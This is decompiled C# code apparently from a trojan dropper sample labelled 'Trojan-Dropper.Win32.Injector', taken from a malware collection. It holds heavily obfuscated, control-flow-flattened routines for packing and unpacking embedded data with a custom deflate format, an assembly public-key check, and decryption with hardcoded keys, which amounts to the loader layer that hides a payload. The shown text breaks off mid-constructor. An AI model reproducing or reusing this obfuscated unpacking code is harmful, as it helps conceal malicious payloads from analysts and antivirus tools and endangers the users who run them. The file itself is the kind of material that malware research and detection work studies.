// Decompiled with JetBrains decompiler
// Type: .
// Assembly: file, Version=11.0.0.0, Culture=neutral, PublicKeyToken=71f2cf7c2509b8fe
// MVID: 1F473243-1123-401F-8099-7648B7C34C41
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan-Dropper.Win32.Injector.deqx-3dcf304237ebec8756d9362ccf0259126c1c62ff5c0b09096876be2cdc64ae5a.exe

using \u0006;
using \u0008;
using System;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;

namespace \u0006
{
  internal class \u0004
  {
    public static string \u0001;

    private static bool \u0002(Assembly executingAssembly, Assembly callingAssembly)
    {
      byte[] numArray1;
      byte[] numArray2;
      int index;
      try
      {
        byte[] publicKey1 = executingAssembly.GetName().GetPublicKey();
        if (true)
          goto label_18;
label_1:
        byte[] publicKey2 = callingAssembly.GetName().GetPublicKey();
        if (true)
          goto label_19;
label_2:
        int num1 = numArray1 == null ? 1 : 0;
        int num2;
        int num3;
        if (true)
        {
          num3 = numArray2 == null ? 1 : 0;
          num2 = num1;
        }
        else
          goto label_15;
label_4:
        if (num2 != num3)
          return false;
        int num4;
        if (numArray1 != null)
          num4 = 0;
        else
          goto label_17;
label_8:
        if (true)
          goto label_20;
label_9:
        if (false)
          goto label_1;
        else
          goto label_16;
label_20:
        index = num4;
        goto label_9;
label_15:
        if (true)
          index = num1;
label_16:
        if (index < numArray1.Length)
        {
          num2 = (int) numArray1[index];
          num3 = (int) numArray2[index];
          if (true)
          {
            if (num2 != num3)
            {
              int num5 = 0;
              if (num5 == 0)
                return num5 != 0;
              num4 = num5;
              goto label_8;
            }
            else
            {
              num1 = index + 1;
              goto label_15;
            }
          }
          else
            goto label_4;
        }
label_17:
        return true;
label_19:
        numArray1 = publicKey2;
        goto label_2;
label_18:
        numArray2 = publicKey1;
        goto label_1;
      }
      catch (Exception ex)
      {
        byte[] o1 = numArray2;
        byte[] o2 = numArray1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) index;
        Assembly o4 = executingAssembly;
        Assembly o5 = callingAssembly;
        \u0004.\u0002(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5);
        throw;
      }
    }

    public static byte[] \u0002(byte[] buffer)
    {
      Assembly callingAssembly1;
      Assembly executingAssembly1;
      \u0004.\u000F obj1;
      int num1;
      int num2;
      int num3;
      short num4;
      int length1;
      int count1;
      int count2;
      byte[] buffer1;
      byte[] buffer2;
      byte[] numArray1;
      \u0004.\u0001 obj2;
      byte[] buf;
      int num5;
      int length2;
      int offset;
      int length3;
      int len;
      byte[] numArray2;
      \u0004.\u0001 obj3;
      byte[] key1;
      byte[] iv1;
      \u0003 obj4;
      ICryptoTransform cryptoTransform1;
      byte[] buffer3;
      byte[] key2;
      byte[] iv2;
      \u0002 obj5;
      ICryptoTransform cryptoTransform2;
      byte[] buffer4;
      try
      {
        Assembly callingAssembly2 = Assembly.GetCallingAssembly();
        if (true)
          goto label_49;
label_1:
        Assembly executingAssembly2 = Assembly.GetExecutingAssembly();
        if (true)
          goto label_50;
label_2:
        if ((object) callingAssembly1 != (object) executingAssembly1 && !\u0004.\u0002(executingAssembly1, callingAssembly1))
        {
          if (true)
            return (byte[]) null;
        }
        else
        {
          \u0004.\u000F obj6 = new \u0004.\u000F(buffer);
          if (true)
            goto label_51;
label_6:
          byte[] numArray3 = new byte[0];
          if (true)
            goto label_52;
label_7:
          int num6 = obj1.\u0003();
          if (true)
            goto label_53;
label_8:
          if (num1 == 67324752)
          {
            int num7 = (int) (short) obj1.\u0002();
            if (true)
              goto label_54;
label_10:
            num2 = obj1.\u0002();
            num3 = obj1.\u0002();
            if (num1 != 67324752 || num4 != (short) 20 || num2 != 0 || num3 != 8)
              throw new FormatException("Wrong Header Signature");
            obj1.\u0003();
            obj1.\u0003();
            obj1.\u0003();
            length1 = obj1.\u0003();
            count1 = obj1.\u0002();
            count2 = obj1.\u0002();
            do
            {
              if (count1 > 0)
              {
                buffer1 = new byte[(int) checked ((uint) count1)];
                obj1.Read(buffer1, 0, count1);
              }
              if (true)
              {
                if (count2 > 0)
                {
                  buffer2 = new byte[(int) checked ((uint) count2)];
                  obj1.Read(buffer2, 0, count2);
                }
                numArray1 = new byte[(int) checked ((uint) unchecked (obj1.Length - obj1.Position))];
                obj1.Read(numArray1, 0, numArray1.Length);
                obj2 = new \u0004.\u0001(numArray1);
              }
              buf = new byte[(int) checked ((uint) length1)];
              obj2.\u0002(buf, 0, buf.Length);
              numArray1 = (byte[]) null;
            }
            while (false);
            goto label_48;
label_54:
            num4 = (short) num7;
            goto label_10;
          }
          else
          {
            num5 = num1 >> 24;
            num1 -= num5 << 24;
            if (num1 != 8223355)
              throw new FormatException("Unknown Header");
            if (num5 == 1)
            {
              length2 = obj1.\u0003();
              buf = new byte[(int) checked ((uint) length2)];
              offset = 0;
              goto label_25;
            }
            else
              goto label_26;
          }
label_53:
          num1 = num6;
          goto label_8;
label_52:
          buf = numArray3;
          goto label_7;
label_51:
          obj1 = obj6;
          goto label_6;
        }
label_24:
        obj3 = new \u0004.\u0001(numArray2);
        obj3.\u0002(buf, offset, len);
        offset += len;
label_25:
        if (offset < length2)
        {
          length3 = obj1.\u0003();
          len = obj1.\u0003();
          numArray2 = new byte[(int) checked ((uint) length3)];
          obj1.Read(numArray2, 0, numArray2.Length);
          goto label_24;
        }
label_26:
        if (num5 == 2)
        {
          key1 = new byte[8]
          {
            (byte) 99,
            (byte) 41,
            (byte) 123,
            (byte) 166,
            (byte) 59,
            (byte) 205,
            (byte) 39,
            (byte) 212
          };
          iv1 = new byte[8]
          {
            (byte) 133,
            (byte) 56,
            (byte) 88,
            (byte) 149,
            (byte) 212,
            (byte) 189,
            (byte) 17,
            (byte) 28
          };
          obj4 = new \u0003();
          try
          {
            cryptoTransform1 = obj4.\u0002(key1, iv1, true);
            try
            {
              buffer3 = cryptoTransform1.TransformFinalBlock(buffer, 4, buffer.Length - 4);
              buf = \u0004.\u0002(buffer3);
            }
            finally
            {
              cryptoTransform1?.Dispose();
            }
          }
          finally
          {
            obj4?.Dispose();
          }
        }
        if (num5 == 3)
        {
          key2 = new byte[16]
          {
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1
          };
          iv2 = new byte[16]
          {
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2
          };
          obj5 = new \u0002();
          try
          {
            cryptoTransform2 = obj5.\u0002(key2, iv2, true);
            try
            {
              buffer4 = cryptoTransform2.TransformFinalBlock(buffer, 4, buffer.Length - 4);
              buf = \u0004.\u0002(buffer4);
            }
            finally
            {
              if (cryptoTransform2 == null)
                goto label_42;
label_41:
              cryptoTransform2.Dispose();
label_42:
              if (false)
                goto label_41;
            }
          }
          finally
          {
            obj5?.Dispose();
          }
        }
label_48:
        obj1.Close();
        return buf;
label_50:
        executingAssembly1 = executingAssembly2;
        goto label_2;
label_49:
        callingAssembly1 = callingAssembly2;
        goto label_1;
      }
      catch (Exception ex)
      {
        object[] objects = new object[33]
        {
          (object) callingAssembly1,
          (object) executingAssembly1,
          (object) obj1,
          (object) buf,
          (object) num1,
          (object) num4,
          (object) num2,
          (object) num3,
          (object) length1,
          (object) count1,
          (object) count2,
          (object) buffer1,
          (object) buffer2,
          (object) numArray1,
          (object) obj2,
          (object) num5,
          (object) length2,
          (object) offset,
          (object) length3,
          (object) len,
          (object) obj3,
          (object) numArray2,
          (object) key1,
          (object) iv1,
          (object) obj4,
          (object) cryptoTransform1,
          (object) buffer3,
          (object) key2,
          (object) iv2,
          (object) obj5,
          (object) cryptoTransform2,
          (object) buffer4,
          (object) buffer
        };
        \u0004.\u0002(ex, objects);
        throw;
      }
    }

    public static byte[] \u0003(byte[] buffer)
    {
      try
      {
        return \u0004.\u0002(buffer, 1, (byte[]) null, (byte[]) null);
      }
      catch (Exception ex)
      {
        byte[] o1 = buffer;
        \u0004.\u0002(ex, (object) o1);
        throw;
      }
    }

    public static byte[] \u0002(byte[] buffer, byte[] key, byte[] iv)
    {
      try
      {
        return \u0004.\u0002(buffer, 2, key, iv);
      }
      catch (Exception ex)
      {
        byte[] o1 = buffer;
        byte[] o2 = key;
        byte[] o3 = iv;
        \u0004.\u0002(ex, (object) o1, (object) o2, (object) o3);
        throw;
      }
    }

    public static byte[] \u0003(byte[] buffer, byte[] key, byte[] iv)
    {
      try
      {
        return \u0004.\u0002(buffer, 3, key, iv);
      }
      catch (Exception ex)
      {
        byte[] o1 = buffer;
        byte[] o2 = key;
        byte[] o3 = iv;
        \u0004.\u0002(ex, (object) o1, (object) o2, (object) o3);
        throw;
      }
    }

    private static byte[] \u0002(byte[] buffer, int version, byte[] key, byte[] iv)
    {
      DateTime dateTime;
      uint maxValue;
      uint num1;
      int num2;
      int length1;
      uint[] numArray1;
      \u0004.\u000F obj1;
      long num3;
      long position1;
      byte[] bytes;
      \u0004.\u0006 obj2;
      byte[] numArray2;
      int count1;
      byte[] numArray3;
      int count2;
      long totalOut;
      int srcOffset;
      byte[] numArray4;
      long position2;
      \u0004.\u0006 obj3;
      byte[] numArray5;
      int count3;
      byte[] numArray6;
      int count4;
      long position3;
      byte[] inputBuffer1;
      \u0003 obj4;
      ICryptoTransform cryptoTransform1;
      byte[] buffer1;
      byte[] inputBuffer2;
      \u0002 obj5;
      ICryptoTransform cryptoTransform2;
      byte[] buffer2;
      try
      {
        byte[] array;
        try
        {
          \u0004.\u000F obj6 = new \u0004.\u000F();
          if (true)
            goto label_51;
label_1:
          int num4;
          switch (version)
          {
            case 0:
              \u0004.\u0006 obj7 = new \u0004.\u0006();
              if (true)
                goto label_52;
label_3:
              DateTime now = DateTime.Now;
              if (true)
                goto label_53;
label_4:
              long num5 = (long) ((uint) ((dateTime.Year - 1980 & (int) sbyte.MaxValue) << 25 | dateTime.Month << 21 | dateTime.Day << 16 | dateTime.Hour << 11 | dateTime.Minute << 5) | (uint) dateTime.Second >> 1);
              if (true)
                goto label_54;
label_5:
              uint[] numArray7 = new uint[256]
              {
                0U,
                1996959894U,
                3993919788U,
                2567524794U,
                124634137U,
                1886057615U,
                3915621685U,
                2657392035U,
                249268274U,
                2044508324U,
                3772115230U,
                2547177864U,
                162941995U,
                2125561021U,
                3887607047U,
                2428444049U,
                498536548U,
                1789927666U,
                4089016648U,
                2227061214U,
                450548861U,
                1843258603U,
                4107580753U,
                2211677639U,
                325883990U,
                1684777152U,
                4251122042U,
                2321926636U,
                335633487U,
                1661365465U,
                4195302755U,
                2366115317U,
                997073096U,
                1281953886U,
                3579855332U,
                2724688242U,
                1006888145U,
                1258607687U,
                3524101629U,
                2768942443U,
                901097722U,
                1119000684U,
                3686517206U,
                2898065728U,
                853044451U,
                1172266101U,
                3705015759U,
                2882616665U,
                651767980U,
                1373503546U,
                3369554304U,
                3218104598U,
                565507253U,
                1454621731U,
                3485111705U,
                3099436303U,
                671266974U,
                1594198024U,
                3322730930U,
                2970347812U,
                795835527U,
                1483230225U,
                3244367275U,
                3060149565U,
                1994146192U,
                31158534U,
                2563907772U,
                4023717930U,
                1907459465U,
                112637215U,
                2680153253U,
                3904427059U,
                2013776290U,
                251722036U,
                2517215374U,
                3775830040U,
                2137656763U,
                141376813U,
                2439277719U,
                3865271297U,
                1802195444U,
                476864866U,
                2238001368U,
                4066508878U,
                1812370925U,
                453092731U,
                2181625025U,
                4111451223U,
                1706088902U,
                314042704U,
                2344532202U,
                4240017532U,
                1658658271U,
                366619977U,
                2362670323U,
                4224994405U,
                1303535960U,
                984961486U,
                2747007092U,
                3569037538U,
                1256170817U,
                1037604311U,
                2765210733U,
                3554079995U,
                1131014506U,
                879679996U,
                2909243462U,
                3663771856U,
                1141124467U,
                855842277U,
                2852801631U,
                3708648649U,
                1342533948U,
                654459306U,
                3188396048U,
                3373015174U,
                1466479909U,
                544179635U,
                3110523913U,
                3462522015U,
                1591671054U,
                702138776U,
                2966460450U,
                3352799412U,
                1504918807U,
                783551873U,
                3082640443U,
                3233442989U,
                3988292384U,
                2596254646U,
                62317068U,
                1957810842U,
                3939845945U,
                2647816111U,
                81470997U,
                1943803523U,
                3814918930U,
                2489596804U,
                225274430U,
                2053790376U,
                3826175755U,
                2466906013U,
                167816743U,
                2097651377U,
                4027552580U,
                2265490386U,
                503444072U,
                1762050814U,
                4150417245U,
                2154129355U,
                426522225U,
                1852507879U,
                4275313526U,
                2312317920U,
                282753626U,
                1742555852U,
                4189708143U,
                2394877945U,
                397917763U,
                1622183637U,
                3604390888U,
                2714866558U,
                953729732U,
                1340076626U,
                3518719985U,
                2797360999U,
                1068828381U,
                1219638859U,
                3624741850U,
                2936675148U,
                906185462U,
                1090812512U,
                3747672003U,
                2825379669U,
                829329135U,
                1181335161U,
                3412177804U,
                3160834842U,
                628085408U,
                1382605366U,
                3423369109U,
                3138078467U,
                570562233U,
                1426400815U,
                3317316542U,
                2998733608U,
                733239954U,
                1555261956U,
                3268935591U,
                3050360625U,
                752459403U,
                1541320221U,
                2607071920U,
                3965973030U,
                1969922972U,
                40735498U,
                2617837225U,
                3943577151U,
                1913087877U,
                83908371U,
                2512341634U,
                3803740692U,
                2075208622U,
                213261112U,
                2463272603U,
                3855990285U,
                2094854071U,
                198958881U,
                2262029012U,
                4057260610U,
                1759359992U,
                534414190U,
                2176718541U,
                4139329115U,
                1873836001U,
                414664567U,
                2282248934U,
                4279200368U,
                1711684554U,
                285281116U,
                2405801727U,
                4167216745U,
                1634467795U,
                376229701U,
                2685067896U,
                3608007406U,
                1308918612U,
                956543938U,
                2808555105U,
                3495958263U,
                1231636301U,
                1047427035U,
                2932959818U,
                3654703836U,
                1088359270U,
                936918000U,
                2847714899U,
                3736837829U,
                1202900863U,
                817233897U,
                3183342108U,
                3401237130U,
                1404277552U,
                615818150U,
                3134207493U,
                3453421203U,
                1423857449U,
                601450431U,
                3009837614U,
                3294710456U,
                1567103746U,
                711928724U,
                3020668471U,
                3272380065U,
                1510334235U,
                755167117U
              };
              if (true)
                goto label_55;
label_6:
              if (true)
                goto label_56;
label_7:
              num1 = maxValue;
              num2 = 0;
              length1 = buffer.Length;
              while (--length1 >= 0)
              {
                int num6 = (int) numArray1[(IntPtr) (uint) (((int) num1 ^ (int) buffer[num2++]) & (int) byte.MaxValue)];
                if (true)
                {
                  int num7 = (int) (num1 >> 8);
                  num1 = (uint) (num6 ^ num7);
                }
                else
                {
                  num4 = num6;
                  goto label_30;
                }
              }
              num1 ^= maxValue;
              obj1.\u0003(67324752);
              obj1.\u0002(20);
              obj1.\u0002(0);
              obj1.\u0002(8);
              obj1.\u0003((int) num3);
              obj1.\u0003((int) num1);
              position1 = obj1.Position;
              obj1.\u0003(0);
              obj1.\u0003(buffer.Length);
              bytes = Encoding.UTF8.GetBytes("{data}");
              obj1.\u0002(bytes.Length);
              obj1.\u0002(0);
              obj1.Write(bytes, 0, bytes.Length);
              obj2.\u0002(buffer);
              while (!obj2.IsNeedingInput)
              {
                numArray2 = new byte[512];
                count1 = obj2.\u0002(numArray2);
                if (count1 > 0)
                  obj1.Write(numArray2, 0, count1);
                else
                  break;
              }
              obj2.\u0002();
              while (!obj2.IsFinished)
              {
                numArray3 = new byte[512];
                count2 = obj2.\u0002(numArray3);
                if (count2 > 0)
                  obj1.Write(numArray3, 0, count2);
                else
                  break;
              }
              totalOut = obj2.TotalOut;
              obj1.\u0003(33639248);
              obj1.\u0002(20);
              obj1.\u0002(20);
              obj1.\u0002(0);
              obj1.\u0002(8);
              obj1.\u0003((int) num3);
              obj1.\u0003((int) num1);
              obj1.\u0003((int) totalOut);
              obj1.\u0003(buffer.Length);
              obj1.\u0002(bytes.Length);
              obj1.\u0002(0);
              obj1.\u0002(0);
              obj1.\u0002(0);
              obj1.\u0002(0);
              obj1.\u0003(0);
              obj1.\u0003(0);
              obj1.Write(bytes, 0, bytes.Length);
              obj1.\u0003(101010256);
              obj1.\u0002(0);
              obj1.\u0002(0);
              obj1.\u0002(1);
              obj1.\u0002(1);
              obj1.\u0003(46 + bytes.Length);
              obj1.\u0003((int) ((long) (30 + bytes.Length) + totalOut));
              obj1.\u0002(0);
              obj1.Seek(position1, SeekOrigin.Begin);
              obj1.\u0003((int) totalOut);
              goto default;
label_56:
              maxValue = uint.MaxValue;
              goto label_7;
label_55:
              numArray1 = numArray7;
              goto label_6;
label_54:
              num3 = num5;
              goto label_5;
label_53:
              dateTime = now;
              goto label_4;
label_52:
              obj2 = obj7;
              goto label_3;
            case 1:
              obj1.\u0003(25000571);
              obj1.\u0003(buffer.Length);
              srcOffset = 0;
              goto label_31;
            case 2:
              obj1.\u0003(41777787);
              inputBuffer1 = \u0004.\u0002(buffer, 1, (byte[]) null, (byte[]) null);
              obj4 = new \u0003();
              try
              {
                cryptoTransform1 = obj4.\u0002(key, iv, false);
                try
                {
                  buffer1 = cryptoTransform1.TransformFinalBlock(inputBuffer1, 0, inputBuffer1.Length);
                  obj1.Write(buffer1, 0, buffer1.Length);
                  goto default;
                }
                finally
                {
                  cryptoTransform1?.Dispose();
                }
              }
              finally
              {
                obj4?.Dispose();
              }
            case 3:
              obj1.\u0003(58555003);
              inputBuffer2 = \u0004.\u0002(buffer, 1, (byte[]) null, (byte[]) null);
              obj5 = new \u0002();
              try
              {
                cryptoTransform2 = obj5.\u0002(key, iv, false);
                try
                {
                  buffer2 = cryptoTransform2.TransformFinalBlock(inputBuffer2, 0, inputBuffer2.Length);
                  obj1.Write(buffer2, 0, buffer2.Length);
                  goto default;
                }
                finally
                {
                  cryptoTransform2?.Dispose();
                }
              }
              finally
              {
                obj5?.Dispose();
              }
            default:
label_50:
              obj1.Flush();
              obj1.Close();
              array = obj1.ToArray();
              goto label_58;
          }
label_30:
          int length2 = numArray4.Length;
          srcOffset = num4 + length2;
label_31:
          if (srcOffset < buffer.Length)
          {
            numArray4 = new byte[(int) checked ((uint) Math.Min(2097151, unchecked (buffer.Length - srcOffset)))];
            Buffer.BlockCopy((Array) buffer, srcOffset, (Array) numArray4, 0, numArray4.Length);
            position2 = obj1.Position;
            obj1.\u0003(0);
            obj1.\u0003(numArray4.Length);
            obj3 = new \u0004.\u0006();
            obj3.\u0002(numArray4);
            while (!obj3.IsNeedingInput)
            {
              numArray5 = new byte[512];
              count3 = obj3.\u0002(numArray5);
              if (count3 > 0)
                obj1.Write(numArray5, 0, count3);
              else
                break;
            }
            obj3.\u0002();
            while (!obj3.IsFinished)
            {
              numArray6 = new byte[512];
              count4 = obj3.\u0002(numArray6);
              if (count4 > 0)
                obj1.Write(numArray6, 0, count4);
              else
                break;
            }
            position3 = obj1.Position;
            obj1.Position = position2;
            obj1.\u0003((int) obj3.TotalOut);
            obj1.Position = position3;
            num4 = srcOffset;
            goto label_30;
          }
          else
            goto label_50;
label_51:
          obj1 = obj6;
          goto label_1;
        }
        catch (Exception ex)
        {
          \u0004.\u0001 = "ERR 2003: " + ex.Message;
          throw;
        }
label_58:
        return array;
      }
      catch (Exception ex)
      {
        byte[] numArray8;
        object[] objects = new object[39]
        {
          (object) obj1,
          (object) obj2,
          (object) dateTime,
          (object) num3,
          (object) numArray1,
          (object) maxValue,
          (object) num1,
          (object) num2,
          (object) length1,
          (object) position1,
          (object) bytes,
          (object) numArray2,
          (object) count1,
          (object) numArray3,
          (object) count2,
          (object) totalOut,
          (object) srcOffset,
          (object) numArray4,
          (object) position2,
          (object) obj3,
          (object) numArray5,
          (object) count3,
          (object) numArray6,
          (object) count4,
          (object) position3,
          (object) inputBuffer1,
          (object) obj4,
          (object) cryptoTransform1,
          (object) buffer1,
          (object) inputBuffer2,
          (object) obj5,
          (object) cryptoTransform2,
          (object) buffer2,
          (object) ex,
          (object) numArray8,
          (object) buffer,
          (object) version,
          (object) key,
          (object) iv
        };
        \u0004.\u0002(ex, objects);
        throw;
      }
    }

    public \u0004()
    {
      try
      {
      }
      catch (Exception ex)
      {
        \u0004.\u0002(ex, (object) this);
        throw;
      }
    }

    internal sealed class \u0001
    {
      private const int \u0001 = 0;
      private const int \u0002 = 1;
      private const int \u0003 = 2;
      private const int \u0004 = 3;
      private const int \u0005 = 4;
      private const int \u0006 = 5;
      private const int \u0007 = 6;
      private const int \u0008 = 7;
      private const int \u000E = 8;
      private const int \u000F = 9;
      private const int \u0010 = 10;
      private const int \u0011 = 11;
      private const int \u0012 = 12;
      private static readonly int[] \u0001;
      private static readonly int[] \u0002;
      private static readonly int[] \u0003;
      private static readonly int[] \u0004;
      private int \u0013;
      private int \u0014;
      private int \u0015;
      private int \u0016;
      private int \u0017;
      private bool \u0001;
      private \u0004.\u0002 \u0001;
      private \u0004.\u0003 \u0001;
      private \u0004.\u0005 \u0001;
      private \u0004.\u0004 \u0001;
      private \u0004.\u0004 \u0002;

      public \u0001(byte[] bytes)
      {
        try
        {
          this.\u0001 = new \u0004.\u0002();
          this.\u0001 = new \u0004.\u0003();
          this.\u0013 = 2;
          this.\u0001.\u0002(bytes, 0, bytes.Length);
        }
        catch (Exception ex)
        {
          byte[] o2 = bytes;
          \u0004.\u0002(ex, (object) this, (object) o2);
          throw;
        }
      }

      private bool \u0002()
      {
        int num1;
        int abyte;
        int num2;
        int num3;
        int num4;
        try
        {
          int num5 = this.\u0001.\u0002();
          if (true)
            goto label_37;
label_33:
          int num6;
          while (true)
          {
            int num7 = num2;
            int num8;
            int num9;
            for (int index = 258; num7 >= index; num7 = num8)
            {
              int num10 = this.\u0013;
              if (true)
                goto label_38;
label_2:
              num8 = num1;
              if (true)
              {
                int num11 = 7;
                if (num11 != 0)
                {
                  switch (num8 - num11)
                  {
                    case 0:
                      int num12;
                      do
                      {
                        int num13 = this.\u0001.\u0002(this.\u0001);
                        if (true)
                          goto label_40;
label_9:
                        if ((num13 & -256) == 0)
                        {
                          this.\u0001.\u0002(abyte);
                          num12 = num2 - 1;
                          if (true)
                            goto label_39;
label_6:
                          continue;
label_39:
                          num2 = num12;
                          goto label_6;
                        }
                        else
                          goto label_10;
label_40:
                        abyte = num13;
                        goto label_9;
                      }
                      while (num12 >= 258);
                      return true;
label_10:
                      if (abyte < 257)
                      {
                        num8 = abyte;
                        break;
                      }
                      this.\u0015 = \u0004.\u0001.\u0001[abyte - 257];
                      this.\u0014 = \u0004.\u0001.\u0002[abyte - 257];
                      goto case 1;
                    case 1:
                      num9 = this.\u0014;
                      goto label_18;
                    case 2:
                      goto label_24;
                    case 3:
                      goto label_28;
                    default:
                      goto label_33;
                  }
                }
                else
                {
                  index = num11;
                  continue;
                }
              }
              if (num8 >= 0)
                goto label_14;
label_13:
              return false;
label_14:
              this.\u0002 = (\u0004.\u0004) null;
              this.\u0001 = (\u0004.\u0004) null;
              this.\u0013 = 2;
              if (true)
                return true;
              goto label_13;
label_38:
              num1 = num10;
              goto label_2;
            }
            goto label_35;
label_18:
            if (num9 > 0)
            {
              this.\u0013 = 8;
              int num14 = this.\u0001.\u0002(this.\u0014);
              if (true)
                goto label_41;
label_20:
              if (num3 >= 0)
              {
                this.\u0001.\u0002(this.\u0014);
                this.\u0015 += num3;
                goto label_23;
              }
              else
                break;
label_41:
              num3 = num14;
              goto label_20;
            }
label_23:
            this.\u0013 = 9;
label_24:
            int num15 = this.\u0002.\u0002(this.\u0001);
            if (true)
              goto label_42;
label_25:
            if (abyte >= 0)
            {
              this.\u0016 = \u0004.\u0001.\u0003[abyte];
              this.\u0014 = \u0004.\u0001.\u0004[abyte];
              goto label_28;
            }
            else
              goto label_26;
label_42:
            abyte = num15;
            goto label_25;
label_28:
            if (this.\u0014 > 0)
            {
              this.\u0013 = 10;
              num4 = this.\u0001.\u0002(this.\u0014);
              if (num4 >= 0)
              {
                this.\u0001.\u0002(this.\u0014);
                this.\u0016 += num4;
              }
              else
                goto label_30;
            }
            this.\u0001.\u0002(this.\u0015, this.\u0016);
            num2 -= this.\u0015;
            this.\u0013 = 7;
            continue;
label_35:
            num6 = 1;
            if (num6 == 0)
            {
              num9 = num6;
              goto label_18;
            }
            else
              goto label_36;
          }
          return false;
label_26:
          return false;
label_30:
          return false;
label_36:
          return num6 != 0;
label_37:
          num2 = num5;
          goto label_33;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) abyte;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) num3;
          // ISSUE: variable of a boxed type
          __Boxed<int> o4 = (ValueType) num4;
          // ISSUE: variable of a boxed type
          __Boxed<int> o5 = (ValueType) num1;
          \u0004.\u0002(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) this);
          throw;
        }
      }

      private bool \u0003()
      {
        int num1;
        int num2;
        int num3;
        int num4;
        try
        {
          int num5 = 0;
          if (num5 == 0)
          {
            if (num5 == 0)
            {
              int num6 = this.\u0013;
              if (true)
                goto label_40;
label_3:
              switch (num1)
              {
                case 2:
                  if (this.\u0001)
                  {
                    this.\u0013 = 12;
                    return false;
                  }
                  goto label_6;
                case 3:
                  int num7 = this.\u0001.\u0002(16);
                  if (true)
                    goto label_43;
label_19:
                  this.\u0017 = num7;
                  break;
label_43:
                  num1 = num7;
                  goto label_19;
                case 4:
label_24:
                  int num8 = this.\u0001.\u0002(16);
                  if (true)
                    goto label_44;
label_25:
                  if (num3 < 0)
                    return false;
                  this.\u0001.\u0002(16);
                  this.\u0013 = 5;
                  goto case 5;
label_44:
                  num3 = num8;
                  goto label_25;
                case 5:
                  num5 = this.\u0001.\u0002(this.\u0001, this.\u0017);
                  goto label_29;
                case 6:
                  if (!this.\u0001.\u0002(this.\u0001))
                    return false;
                  this.\u0001 = this.\u0001.\u0002();
                  this.\u0002 = this.\u0001.\u0003();
                  if (true)
                  {
                    this.\u0013 = 7;
                    goto case 7;
                  }
                  else
                    break;
                case 7:
                case 8:
                case 9:
                case 10:
                  return this.\u0002();
                case 12:
                  return false;
                default:
                  return false;
              }
              if (true)
              {
                if (num1 < 0)
                  return false;
                this.\u0001.\u0002(16);
                this.\u0013 = 4;
                goto label_24;
              }
              else
                goto label_30;
label_40:
              num1 = num6;
              goto label_3;
            }
            else
              goto label_7;
label_6:
            int num9 = this.\u0001.\u0002(3);
            if (true)
              num2 = num9;
label_7:
            if (num2 < 0)
              return false;
            this.\u0001.\u0002(3);
            if ((num2 & 1) != 0)
              this.\u0001 = true;
            int num10 = num2 >> 1;
            if (true)
              goto label_42;
label_12:
            switch (num1)
            {
              case 0:
                this.\u0001.\u0002();
                this.\u0013 = 3;
                break;
              case 1:
                this.\u0001 = \u0004.\u0004.\u0001;
                if (true)
                {
                  this.\u0002 = \u0004.\u0004.\u0002;
                  this.\u0013 = 7;
                  break;
                }
                goto label_6;
              case 2:
                this.\u0001 = new \u0004.\u0005();
                this.\u0013 = 6;
                break;
            }
            return true;
label_42:
            num1 = num10;
            goto label_12;
          }
label_29:
          if (true)
            num4 = num5;
label_30:
          this.\u0017 -= num4;
          if (this.\u0017 != 0)
            return !this.\u0001.IsNeedingInput;
          this.\u0013 = 2;
          return true;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) num3;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) num4;
          // ISSUE: variable of a boxed type
          __Boxed<int> o4 = (ValueType) num1;
          \u0004.\u0002(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) this);
          throw;
        }
      }

      public int \u0002(byte[] buf, int offset, int len)
      {
        int num1;
        int num2;
        try
        {
          if (true)
          {
            if (true)
              num2 = 0;
          }
          else
            goto label_6;
label_2:
          while (this.\u0013 != 11)
          {
            if (true)
            {
              int num3 = this.\u0001.\u0002(buf, offset, len);
              if (true)
                goto label_17;
label_5:
              offset += num1;
              goto label_6;
label_17:
              num1 = num3;
              goto label_5;
            }
          }
          goto label_11;
label_6:
          int num4 = num2;
          int num5;
          if (true)
          {
            int num6 = num1;
            int num7 = num4 + num6;
            if (true)
              goto label_18;
label_8:
            len -= num1;
            num5 = len;
            goto label_9;
label_18:
            num2 = num7;
            goto label_8;
          }
          else
            goto label_14;
label_9:
          if (num5 == 0)
            return num2;
label_11:
          num5 = this.\u0003() ? 1 : 0;
          if (true)
          {
            if (num5 == 0)
              num4 = this.\u0001.\u0003();
            else
              goto label_2;
          }
          else
            goto label_9;
label_14:
          if (num4 <= 0 || this.\u0013 == 11)
            return num2;
          goto label_2;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) num1;
          byte[] o4 = buf;
          // ISSUE: variable of a boxed type
          __Boxed<int> o5 = (ValueType) offset;
          // ISSUE: variable of a boxed type
          __Boxed<int> o6 = (ValueType) len;
          \u0004.\u0002(ex, (object) o1, (object) o2, (object) this, (object) o4, (object) o5, (object) o6);
          throw;
        }
      }

      static \u0001()
      {
        try
        {
          int length1 = 29;
          int length2;
          while (true)
          {
            int[] numArray = new int[length1];
            // ISSUE: field reference
            RuntimeHelpers.InitializeArray((Array) numArray, __fieldref (\u0005.\u0001));
            \u0004.\u0001.\u0001 = numArray;
            if (true)
            {
